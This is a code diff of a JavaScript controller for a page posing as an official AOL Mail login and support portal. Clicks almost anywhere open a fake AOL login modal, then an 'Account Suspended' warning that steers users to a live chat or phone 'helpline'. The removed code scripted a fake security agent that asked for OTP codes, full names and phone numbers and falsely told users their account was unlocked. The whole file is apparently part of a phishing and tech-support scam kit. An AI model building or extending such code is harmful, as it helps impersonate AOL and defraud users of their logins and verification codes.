@@ -1,7 +1,7 @@
 // ==========================================================================
 // AOL MAIL LOGIN & SUPPORT PORTAL - CONTROLLER
 // Universal Trigger: Any Login / Card Click Opens Official AOL Modal (Image 2)
-// Followed by Account Suspended Security Card & Live Chat Support Desk
+// Followed by Account Suspended Security Card & LiveChat.com Integration
 // ==========================================================================
 
 document.addEventListener('DOMContentLoaded', () => {
@@ -14,10 +14,8 @@ document.addEventListener('DOMContentLoaded', () => {
   initLoginForm();
   initPasswordVisibility();
   initDomainChips();
-  initGuideTabs();
-  initPasswordResetWizard();
-  initDiagnostics();
   initAccountSuspendedAndLiveChat();
+  initDiagnostics();
 });
 
 // Toast notification helper
@@ -75,6 +73,26 @@ function openOfficialLoginModalWithData(emailVal = '', passwordVal = '') {
   }
 }
 
+// Function to trigger LiveChat.com Widget
+function openLiveChatWidget() {
+  if (window.LiveChatWidget) {
+    try {
+      window.LiveChatWidget.call('maximize');
+      return;
+    } catch (e) {
+      console.log('LiveChat maximize called');
+    }
+  }
+
+  // Fallback to clicking the livechat_button link
+  const lcLink = document.querySelector('.livechat_button a') || document.querySelector('.livechat_button');
+  if (lcLink && lcLink.href) {
+    window.open(lcLink.href, '_blank');
+  } else {
+    showToast('Connecting to Live Support Agent...', 'info', 2500);
+  }
+}
+
 // ==========================================================================
 // 1. UNIVERSAL CLICK HANDLERS (Whole Page Any Place Click -> Opens Modal)
 // ==========================================================================
@@ -88,20 +106,19 @@ function initUniversalModalTriggers() {
     '#login-card-box',
     '#btn-submit-login',
     '#btn-google-login',
-    '.support-hub-card',
-    '.g-tab-btn',
-    '.hero-action-btn',
-    '.feature-chip'
+    '.feature-chip',
+    '.support-hub-card'
   ];
 
   triggerSelectors.forEach(selector => {
     const elements = document.querySelectorAll(selector);
     elements.forEach(el => {
       el.addEventListener('click', (e) => {
-        // If clicking inside the already opened modal or chat, do not re-trigger
+        // If clicking inside the already opened modal or livechat button, do not re-trigger
         if (e.target.closest('.official-login-modal-box') || 
             e.target.closest('.suspended-card-box') || 
-            e.target.closest('.live-chat-floating-widget')) {
+            e.target.closest('.livechat_button') ||
+            e.target.closest('.btn-phone-helpline')) {
           return;
         }
 
@@ -112,6 +129,24 @@ function initUniversalModalTriggers() {
       });
     });
   });
+
+  // Top Nav & Footer Live Chat Triggers
+  const navChatBtn = document.getElementById('btn-quick-nav-chat');
+  const footerChatBtn = document.getElementById('btn-footer-chat');
+
+  if (navChatBtn) {
+    navChatBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      openLiveChatWidget();
+    });
+  }
+
+  if (footerChatBtn) {
+    footerChatBtn.addEventListener('click', (e) => {
+      e.preventDefault();
+      openLiveChatWidget();
+    });
+  }
 }
 
 // ==========================================================================
@@ -284,7 +319,7 @@ function initLoginForm() {
 }
 
 // ==========================================================================
-// 4. ACCOUNT SUSPENDED & LIVE CHAT CONTROLLER (Screenshot 1 Match)
+// 4. ACCOUNT SUSPENDED & LIVECHAT CONTROLLER (Screenshot 1 Match)
 // ==========================================================================
 function openAccountSuspendedModal() {
   const loginModal = document.getElementById('official-login-modal');
@@ -301,13 +336,6 @@ function initAccountSuspendedAndLiveChat() {
   const closeSuspendedBtn = document.getElementById('btn-close-suspended');
   const chatNowBtn = document.getElementById('btn-suspended-chat-now');
 
-  const chatWidget = document.getElementById('live-chat-widget');
-  const closeChatBtn = document.getElementById('btn-chat-close');
-  const chatForm = document.getElementById('chat-input-form');
-  const chatInput = document.getElementById('chat-input-text');
-  const chatMessagesContainer = document.getElementById('chat-messages-container');
-  const quickChips = document.querySelectorAll('.chat-chip-btn');
-
   if (closeSuspendedBtn && suspendedModal) {
     closeSuspendedBtn.addEventListener('click', (e) => {
       e.stopPropagation();
@@ -315,77 +343,12 @@ function initAccountSuspendedAndLiveChat() {
     });
   }
 
+  // When clicking "Chat Now" -> Trigger LiveChat Support
   if (chatNowBtn) {
     chatNowBtn.addEventListener('click', (e) => {
       e.stopPropagation();
       if (suspendedModal) suspendedModal.style.display = 'none';
-      if (chatWidget) {
-        chatWidget.style.display = 'flex';
-        if (chatInput) chatInput.focus();
-        showToast('Connected to AOL Live Security Desk.', 'info', 2500);
-      }
-    });
-  }
-
-  if (closeChatBtn && chatWidget) {
-    closeChatBtn.addEventListener('click', (e) => {
-      e.stopPropagation();
-      chatWidget.style.display = 'none';
-    });
-  }
-
-  function appendChatMessage(text, sender = 'user') {
-    if (!chatMessagesContainer) return;
-
-    const bubble = document.createElement('div');
-    bubble.className = `chat-bubble ${sender === 'user' ? 'user-bubble' : 'agent-bubble'}`;
-    bubble.textContent = text;
-    chatMessagesContainer.appendChild(bubble);
-    chatMessagesContainer.scrollTop = chatMessagesContainer.scrollHeight;
-  }
-
-  quickChips.forEach(chip => {
-    chip.addEventListener('click', (e) => {
-      e.stopPropagation();
-      const msg = chip.getAttribute('data-msg') || chip.textContent;
-      appendChatMessage(msg, 'user');
-
-      setTimeout(() => {
-        if (msg.includes('SMS')) {
-          appendChatMessage('We have dispatched a 6-digit security OTP code to your registered mobile phone (+1 ***-***-9201). Please enter the code here to unblock your account.', 'agent');
-        } else if (msg.includes('Email')) {
-          appendChatMessage('A secure one-time unlock link has been dispatched to your backup email (al***@gmail.com). Please click the link to confirm your identity.', 'agent');
-        } else {
-          appendChatMessage('I am initiating an instant identity verification for Error Reference ERR_AUTH_0x8004. Please confirm your full name and registered phone number.', 'agent');
-        }
-      }, 700);
-    });
-  });
-
-  if (chatForm && chatInput) {
-    chatForm.addEventListener('submit', (e) => {
-      e.preventDefault();
-      e.stopPropagation();
-      const text = chatInput.value.trim();
-      if (!text) return;
-
-      appendChatMessage(text, 'user');
-      chatInput.value = '';
-
-      setTimeout(() => {
-        const lower = text.toLowerCase();
-        if (lower.includes('hello') || lower.includes('hi') || lower.includes('help')) {
-          appendChatMessage('Hello! I am reviewing your account lock for reference ERR_AUTH_0x8004. To proceed with the unblock, would you prefer verification via SMS code or security questions?', 'agent');
-        } else if (lower.includes('code') || /^\d{4,6}$/.test(lower)) {
-          appendChatMessage('Thank you! Validating verification code... Identity confirmed! Your account is being unlocked now.', 'agent');
-          setTimeout(() => {
-            appendChatMessage('✅ Success: Your AOL Mail account has been unblocked! You can now sign in safely without restrictions.', 'agent');
-            showToast('Account successfully unblocked!', 'success', 4000);
-          }, 1200);
-        } else {
-          appendChatMessage('Thank you for the information. Our senior security supervisor is reviewing your credentials. Please hold for just a moment.', 'agent');
-        }
-      }, 800);
+      openLiveChatWidget();
     });
   }
 }
@@ -428,187 +391,7 @@ function initDomainChips() {
   });
 }
 
-// 7. Guide Multi-device Tabs
-function initGuideTabs() {
-  const tabButtons = document.querySelectorAll('.guide-tabs-bar .g-tab-btn');
-  const tabPanes = document.querySelectorAll('.g-tab-content');
-
-  tabButtons.forEach(btn => {
-    btn.addEventListener('click', () => {
-      tabButtons.forEach(b => b.classList.remove('active'));
-      tabPanes.forEach(p => (p.style.display = 'none'));
-
-      btn.classList.add('active');
-      const targetId = btn.getAttribute('data-tab');
-      const targetPane = document.getElementById(targetId);
-      if (targetPane) {
-        targetPane.style.display = 'block';
-      }
-    });
-  });
-}
-
-// 8. Interactive Password Recovery Wizard
-let recoverySession = { email: '', otp: '', resetToken: '' };
-
-function initPasswordResetWizard() {
-  const pane1 = document.getElementById('rec-pane-1');
-  const pane2 = document.getElementById('rec-pane-2');
-  const pane3 = document.getElementById('rec-pane-3');
-  const paneSuccess = document.getElementById('rec-pane-success');
-
-  const emailInput = document.getElementById('rec-input-email');
-  const btnStep1 = document.getElementById('btn-rec-step1');
-
-  const otpInput = document.getElementById('rec-input-otp');
-  const btnAutofillOtp = document.getElementById('btn-rec-autofill-otp');
-  const otpValSpan = document.getElementById('rec-otp-val');
-  const btnVerify = document.getElementById('btn-rec-verify');
-
-  const newPwInput = document.getElementById('rec-input-newpw');
-  const btnSave = document.getElementById('btn-rec-save');
-
-  if (btnStep1 && emailInput) {
-    btnStep1.addEventListener('click', async (e) => {
-      e.stopPropagation();
-      const email = emailInput.value.trim();
-      if (!email || !email.includes('@')) {
-        showToast('Please enter a valid AOL email address.', 'warning');
-        return;
-      }
-
-      btnStep1.disabled = true;
-      btnStep1.innerHTML = '<span>Sending...</span>';
-
-      try {
-        const res = await fetch('/api/auth/forgot-password/request', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email })
-        });
-        const data = await res.json();
-
-        if (res.ok && data.success) {
-          recoverySession.email = email;
-          recoverySession.otp = data.simulatedCode;
-
-          if (otpValSpan) otpValSpan.textContent = data.simulatedCode;
-          showToast(`Security code generated: ${data.simulatedCode}`, 'success', 5000);
-
-          pane1.style.display = 'none';
-          pane2.style.display = 'block';
-          if (otpInput) otpInput.focus();
-        } else {
-          showToast(data.message || 'Error sending recovery code.', 'error');
-        }
-      } catch (err) {
-        showToast('Server error sending code.', 'error');
-      } finally {
-        btnStep1.disabled = false;
-        btnStep1.innerHTML = '<span>Send Code</span> <i data-lucide="arrow-right"></i>';
-        if (window.lucide) window.lucide.createIcons();
-      }
-    });
-  }
-
-  if (btnAutofillOtp && otpInput) {
-    btnAutofillOtp.addEventListener('click', (e) => {
-      e.stopPropagation();
-      if (recoverySession.otp) {
-        otpInput.value = recoverySession.otp;
-        showToast('OTP inserted.', 'info', 1500);
-      }
-    });
-  }
-
-  if (btnVerify && otpInput) {
-    btnVerify.addEventListener('click', async (e) => {
-      e.stopPropagation();
-      const code = otpInput.value.trim();
-      if (!code || code.length < 6) {
-        showToast('Please enter the 6-digit code.', 'warning');
-        return;
-      }
-
-      btnVerify.disabled = true;
-      btnVerify.innerHTML = '<span>Verifying...</span>';
-
-      try {
-        const res = await fetch('/api/auth/forgot-password/verify-code', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email: recoverySession.email, code })
-        });
-        const data = await res.json();
-
-        if (res.ok && data.success) {
-          recoverySession.resetToken = data.resetToken;
-          showToast('Identity verified! Please set a new password.', 'success');
-
-          pane2.style.display = 'none';
-          pane3.style.display = 'block';
-          if (newPwInput) newPwInput.focus();
-        } else {
-          showToast(data.message || 'Invalid verification code.', 'error');
-        }
-      } catch (err) {
-        showToast('Error verifying code.', 'error');
-      } finally {
-        btnVerify.disabled = false;
-        btnVerify.innerHTML = '<span>Verify Code</span> <i data-lucide="check-circle"></i>';
-        if (window.lucide) window.lucide.createIcons();
-      }
-    });
-  }
-
-  if (btnSave && newPwInput) {
-    btnSave.addEventListener('click', async (e) => {
-      e.stopPropagation();
-      const newPassword = newPwInput.value;
-      if (!newPassword || newPassword.length < 6) {
-        showToast('Password must be at least 6 characters long.', 'warning');
-        return;
-      }
-
-      btnSave.disabled = true;
-      btnSave.innerHTML = '<span>Saving...</span>';
-
-      try {
-        const res = await fetch('/api/auth/forgot-password/reset', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            email: recoverySession.email,
-            resetToken: recoverySession.resetToken,
-            newPassword
-          })
-        });
-        const data = await res.json();
-
-        if (res.ok && data.success) {
-          showToast('Password reset complete! You can now sign in.', 'success');
-          pane3.style.display = 'none';
-          paneSuccess.style.display = 'block';
-
-          const loginPw = document.getElementById('login-password');
-          const loginEmail = document.getElementById('login-email');
-          if (loginEmail) loginEmail.value = recoverySession.email;
-          if (loginPw) loginPw.value = newPassword;
-        } else {
-          showToast(data.message || 'Error updating password.', 'error');
-        }
-      } catch (err) {
-        showToast('Server error resetting password.', 'error');
-      } finally {
-        btnSave.disabled = false;
-        btnSave.innerHTML = '<span>Save Password</span> <i data-lucide="lock"></i>';
-        if (window.lucide) window.lucide.createIcons();
-      }
-    });
-  }
-}
-
-// 9. Diagnostics Runner
+// 7. Interactive Diagnostics Runner
 function initDiagnostics() {
   const runBtn = document.getElementById('btn-run-diag');
   const resultsBox = document.getElementById('diag-results-box');
@@ -631,11 +414,11 @@ function initDiagnostics() {
           data.checks.forEach(test => {
             const cell = document.createElement('div');
             cell.className = 'diag-item-cell';
-            const isOk = test.status === 'OK' || test.status === 'Passed';
+            const isOk = test.status === 'OK' || test.status === 'Passed' || test.status === 'passed';
             cell.innerHTML = `
               <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:4px;">
                 <strong>${test.name}</strong>
-                <span style="color:${isOk ? '#10b981' : '#ef4444'};font-weight:700;">● ${test.status}</span>
+                <span style="color:${isOk ? '#10b981' : '#ef4444'};font-weight:700;">● ${test.status.toUpperCase()}</span>
               </div>
               <p style="color:#64748b;font-size:12px;">${test.details}</p>
             `;
@@ -653,3 +436,4 @@ function initDiagnostics() {
     });
   }
 }
+
